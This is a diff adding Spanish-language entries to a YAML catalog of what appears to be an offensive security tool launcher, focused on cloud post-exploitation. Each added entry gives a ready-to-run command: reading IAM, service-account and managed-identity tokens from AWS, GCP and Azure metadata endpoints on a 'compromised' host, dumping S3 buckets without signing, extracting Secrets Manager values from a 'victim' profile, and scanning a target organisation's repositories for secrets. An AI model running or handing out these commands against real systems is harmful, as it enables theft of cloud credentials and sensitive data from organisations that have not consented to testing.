@@ -214,3 +214,69 @@ tools:
         label: "Perfil AWS"
         type: text
         placeholder: "victim"
+
+  # ─────────────────────────────────────────────
+  # CLOUD IMDS SSRF & SECRETS (2023-2024)
+  # ─────────────────────────────────────────────
+
+  - name: "SSRF - AWS IMDS v1 Credentials"
+    description: "Obtener credenciales IAM del metadata service (IMDS v1) via SSRF"
+    command: "# Desde servidor comprometido:\ncurl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null; curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null; ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null); curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE 2>/dev/null | python3 -c 'import sys,json; d=json.load(sys.stdin); print(\"AccessKey:\",d.get(\"AccessKeyId\",\"\")); print(\"SecretKey:\",d.get(\"SecretAccessKey\",\"\")); print(\"Token:\",d.get(\"Token\",\"\")[:30]+\"...\")'"
+    params: []
+    tags: [aws, imds, ssrf, credentials, metadata]
+    notes: "IMDSv2 requiere token: TOKEN=$(curl -s -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' http://169.254.169.254/latest/api/token); curl -H 'X-aws-ec2-metadata-token: $TOKEN' http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+
+  - name: "AWS - S3 Bucket Enum + Dump"
+    description: "Enumera buckets S3 accesibles y descarga contenido sensible"
+    command: "aws s3 ls --no-sign-request s3://{bucket} 2>/dev/null | head -20; aws s3 sync s3://{bucket} /tmp/s3_dump/ --no-sign-request 2>/dev/null | head -10"
+    params:
+      - name: bucket
+        label: "Nombre del bucket"
+        type: text
+        placeholder: "company-backups"
+    tags: [aws, s3, bucket, public-access, cloud]
+    notes: "Buscar buckets: gowitness, lazys3, s3scanner. Sin --no-sign-request si tenemos credenciales."
+
+  - name: "AWS - Secrets Manager Dump"
+    description: "Listar y extraer secretos del AWS Secrets Manager"
+    command: "aws secretsmanager list-secrets --profile {profile} 2>/dev/null | python3 -c 'import sys,json; d=json.load(sys.stdin); [print(s.get(\"Name\",\"\")) for s in d.get(\"SecretList\",[])[:10]]'; aws secretsmanager get-secret-value --secret-id {secret_name} --profile {profile} 2>/dev/null"
+    params:
+      - name: profile
+        label: "Perfil AWS"
+        type: text
+        placeholder: "victim"
+      - name: secret_name
+        label: "Nombre del secreto"
+        type: text
+        placeholder: "prod/db/password"
+    tags: [aws, secrets-manager, credentials, cloud-secrets]
+    notes: "Si IAM lo permite: pueden contener DB passwords, API keys, TLS certs."
+
+  - name: "GCP - Service Account Key + Metadata"
+    description: "Obtener Service Account token y enumerar GCP desde instancia comprometida"
+    command: "# Desde VM comprometida:\ncurl -sH 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' 2>/dev/null; curl -sH 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email' 2>/dev/null"
+    params: []
+    tags: [gcp, metadata, service-account, google-cloud, imds]
+    notes: "Token válido 1h. Usar con: curl -H 'Authorization: Bearer TOKEN' https://www.googleapis.com/storage/v1/b para enum buckets"
+
+  - name: "Azure - IMDS Credentials"
+    description: "Obtener token de acceso Azure desde IMDS en VM comprometida"
+    command: "# Desde Azure VM:\ncurl -sH 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' 2>/dev/null | python3 -c 'import sys,json; d=json.load(sys.stdin); print(d.get(\"access_token\",\"\")[:50]+\"...\")'"
+    params: []
+    tags: [azure, imds, managed-identity, token, microsoft-cloud]
+    notes: "Token de Managed Identity. Usar para enum: Resource Graph, Storage, Key Vault, etc."
+
+  - name: "truffleHog - Secretos en repositorios"
+    description: "Buscar secretos y credenciales en repositorios Git"
+    command: "trufflehog git https://github.com/{org}/{repo} --only-verified 2>/dev/null | head -50"
+    params:
+      - name: org
+        label: "Organización GitHub"
+        type: text
+        placeholder: "targetcorp"
+      - name: repo
+        label: "Repositorio"
+        type: text
+        placeholder: "internal-app"
+    tags: [trufflehog, secrets, git, github, credentials]
+    notes: "También funciona con trufflehog filesystem /path/to/clone. Detecta: AWS keys, private keys, tokens."
